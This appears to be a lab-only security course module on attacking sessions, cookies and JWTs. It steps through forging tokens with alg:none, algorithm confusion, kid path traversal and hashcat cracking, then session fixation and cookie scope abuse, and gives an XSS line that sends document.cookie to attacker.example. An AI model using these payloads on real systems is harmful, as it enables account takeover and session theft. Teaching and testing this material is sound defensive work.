# Week 02: Attack walkthrough — Sessions, Cookies, and JWTs

> ⚠️ **Lab only.** Targets are PortSwigger Academy + Juice Shop on your machine.

---

## Part 1: Reading session state by hand

The first skill: look at *any* request in Burp's HTTP History and immediately know what scheme the site is using to identify you.

### Opaque session cookie

```
Cookie: session=2b3f8a9d1c4e6f78
```

A random string with no obvious structure. The server holds the mapping `session → user_id` server-side (DB, Redis). Compromising it means stealing it.

### JWT in a cookie or Authorization header

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9.dGhpcyBpcyBub3QgcmVhbGx5IGEgc2lnbmF0dXJl
```

Three base64url-encoded parts separated by `.`:

| Part | Decoded |
|---|---|
| `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` | `{"alg":"HS256","typ":"JWT"}` — header |
| `eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9` | `{"sub":"123","role":"user"}` — claims |
| `dGhpcy...` | HMAC-SHA256 signature over `header.payload` |

The first two parts are **plaintext**. Anyone holding the JWT can read the claims. The signature stops *modification*, not *reading*.

> 💡 **Burp shortcut:** install the **JWT Editor** extension. It decodes the JWT inline and lets you modify claims with one click.

## Part 2: JWT attacks

### Attack 1: `alg: none` — strip the signature entirely

The JWT spec includes a value `none` for the `alg` field, meaning "unsigned." A buggy verifier accepts this:

```
Original:  Header { "alg": "HS256" }    Signature: <real HMAC>
Forged:    Header { "alg": "none" }     Signature: <empty>
```

In Burp:

1. Capture an authenticated request with a JWT.
2. Open the JWT in the JWT Editor.
3. Change `alg` to `none`. Clear the signature. Save.
4. Modify a claim (`"role": "admin"`).
5. Send.

A vulnerable server reads `alg: none`, doesn't validate, accepts the claim. You're now admin.

Most modern JWT libraries reject `alg: none` *only if you pass an explicit `algorithms=` allow-list to `verify()`*. Many libraries' defaults — including `node-jsonwebtoken` <v9 — silently accepted `alg: none` in the recent past. The PortSwigger "Unverified signature" lab demonstrates this against real-world configurations. **Always pass `algorithms=['RS256']` (or whatever you actually expect) — don't rely on the default.**

### Attack 2: Flawed verification (no signature check)

Some implementations *parse* the JWT but never call the verify function. The result is identical to `alg: none`, but the JWT still *looks* signed:

1. Take a valid JWT.
2. Modify a claim.
3. **Leave the signature unchanged** — don't recompute it.
4. Send.

If the response accepts you with the modified claim, the server is parsing without verifying. PortSwigger's "JWT authentication bypass via unverified signature" lab.

### Attack 3: Algorithm confusion (RS256 → HS256)

The dangerous one. The server expects asymmetric (`RS256`) — verifying with the public key. An attacker switches to symmetric (`HS256`) and signs with the **public key as the HMAC secret**:

```mermaid
---
config:
  look: handDrawn
  theme: neutral
---
flowchart TB
    Original["Server's expectation:<br/>alg = RS256<br/>verify with public key"]
    Attacker["Attacker's forgery:<br/>alg = HS256<br/>HMAC signed with public key as key"]
    Server["Vulnerable verifier:<br/>'just use the verification key'<br/>→ HMAC-verifies with public key"]
    Match["Signature matches!<br/>JWT accepted"]

    Original --> Server
    Attacker --> Server
    Server --> Match
```

The bug: a verification function that blindly applies the JWT's stated algorithm with the server-side key, regardless of whether that key was meant for asymmetric or symmetric crypto.

To exploit, you need the public key (often exposed at `/.well-known/jwks.json` or in TLS certs). Then:

```bash
# Build a JWT with alg=HS256, sign with the public-key bytes as HMAC secret.
# Note: `base64url` isn't standard; use openssl + tr to produce URL-safe base64.
echo -n "$header.$payload" \
  | openssl dgst -sha256 -hmac "$(cat public_key.pem)" -binary \
  | openssl base64 | tr '+/' '-_' | tr -d '='
```

> 💬 **In practice you usually need to try several encodings of the public key** — the PEM as-is, the PEM with the trailing newline trimmed, just the base64 body without headers, the raw DER, and what `cryptography.hazmat.primitives.serialization.public_bytes()` produces. Different verifier implementations hand different byte sequences to the HMAC. Script all five for an engagement.

PortSwigger's "Algorithm confusion" lab walks through this in detail. **Read it; this attack still hits production code in 2026.**

The same confusion has more variants: **RS256 ↔ ES256** (RSA public key reused as ECDSA verification key) and **RS256 ↔ EdDSA**. Fix is the same for all: explicit `algorithms=` allow-list naming exactly what the server expects, never reading `alg` from the JWT header.

### Attack 4: `kid` injection (path traversal in key lookup)

The `kid` (key ID) header field tells the verifier *which* key to use. If the server uses `kid` directly as a filesystem path or DB lookup, you can inject:

```json
{"alg":"HS256","kid":"../../../../dev/null","typ":"JWT"}
```

`/dev/null` reads as an empty file. The verifier uses `""` as the HMAC key. Sign your JWT with the same empty key, and it verifies.

### Attack 5: Weak HMAC secret (brute force)

`HS256` with a weak secret is a one-line crack:

```bash
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
```

Common weak secrets to watch for: `secret`, `your-256-bit-secret`, the project name, the company name, a config-default string. If you find a JWT in a bug bounty or pentest, always cracking it first.

## Part 3: Cookie / session attacks

### Attack 6: Session fixation

The classic. The attacker provides the victim with a session ID they already know:

```mermaid
---
config:
  look: handDrawn
  theme: neutral
---
flowchart LR
    A1[Attacker grabs<br/>anonymous session ID<br/>from the site]
    A2[Tricks victim to<br/>visit URL containing<br/>that session ID]
    V[Victim logs in;<br/>site upgrades the<br/>same session to<br/>authenticated]
    A3[Attacker now holds<br/>an authenticated<br/>session as victim]

    A1 --> A2 --> V --> A3
```

The fix is simple: **rotate the session ID at every privilege change** (login, logout, MFA-success, role change). The bug: many frameworks default to reusing the same session ID across login.

In the PortSwigger session-fixation lab, you'll fix a session, get the victim to log in via the predictable token, then use the now-authenticated token yourself.

### Attack 7: Predictable session IDs

Some homemade session ID generators use bad sources of randomness:

| Source | Why it's broken |
|---|---|
| `Math.random()` | Not cryptographic; output predictable from a few observed values |
| Sequential counter | Trivially enumerable |
| `md5(username + timestamp)` | Reversible given known username; timestamp window is small |
| `base64(user_id + secret)` | Decoded reveals user_id and likely the secret if it leaks elsewhere |

Capture 10 session IDs. Look for patterns. If you see incrementing bytes, hex-encoded timestamps, or short strings, dig in.

### Attack 8: Cookie scope abuse

Cookies have scope defined by:

```
Set-Cookie: session=abc; Domain=.example.com; Path=/
```

`Domain=.example.com` means the cookie is sent to **every subdomain**. If an attacker controls *any* subdomain (e.g. via a vulnerable sub-app, a typo'd takeover, or XSS in `marketing.example.com`), they can read the main app's session cookie.

The fix: don't set `Domain` unless you actually need cross-subdomain sharing. The default ("host-only") is safer.

### Attack 9: Stealing cookies via XSS

We did the basics in Week 01. With sessions in scope this week, the chain is:

```js
fetch('https://attacker.example/?c=' + encodeURIComponent(document.cookie))
```

This **only works if the cookie lacks `HttpOnly`**. The single most impactful hardening for session cookies is `HttpOnly` — it doesn't prevent XSS, but it forces the attacker to use the cookie via the victim's browser (CSRF-style) rather than exfiltrating it.

### Attack 10: "Remember me" tokens

Long-lived "remember me" tokens are tempting attack surface:

- Often stored less securely than session cookies (DB plaintext)
- Long TTL — months
- Often allow login *without* MFA
- Sometimes recoverable from cookies on devices the user no longer owns

When testing, look for `Set-Cookie: remember_me=...; Max-Age=2592000` and ask: how is this validated? What does it bypass?

## Common mistakes when learning

- **Assuming opaque == secure.** Opaque session IDs are only as secure as their generator and the channel they travel over.
- **Pasting JWT secrets from blog posts as your test secret.** The cracking dictionaries are full of these.
- **Skipping the `alg: none` step because "no one ships that anymore."** They do. Including major vendors as recently as 2023.
- **Forgetting that JWT claims are public.** Storing PII or secrets in a JWT payload is a leak.
- **Not checking what the server does with the JWT's `kid`.** It's an injection point.

Now read [defense.md](defense.md).
